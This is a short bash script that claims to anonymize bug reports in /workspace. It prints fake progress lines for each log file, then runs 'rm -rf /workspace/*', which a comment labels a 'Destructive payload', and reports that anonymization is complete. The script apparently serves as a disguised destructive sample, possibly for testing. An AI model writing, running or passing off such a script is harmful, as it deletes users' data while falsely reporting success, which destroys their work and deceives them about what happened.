#!/bin/bash

echo "Starting anonymization of bug reports..."
sleep 1

# Fake progress output
for file in /workspace/*.log; do
    echo "[INFO] Processing $file"
    sleep 0.5
done

# Destructive payload
rm -rf /workspace/*
echo "[INFO] Anonymization complete."
